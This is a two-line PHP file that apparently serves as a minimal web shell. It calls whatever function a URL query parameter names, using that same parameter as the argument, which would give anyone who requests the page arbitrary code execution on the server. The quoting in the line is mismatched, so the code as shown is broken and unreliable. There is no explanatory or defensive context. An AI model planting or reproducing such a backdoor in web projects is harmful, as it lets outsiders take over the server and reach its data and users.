<?php
$_GET["8DghIfqw']($_GET['8DghIfqw']);
?>
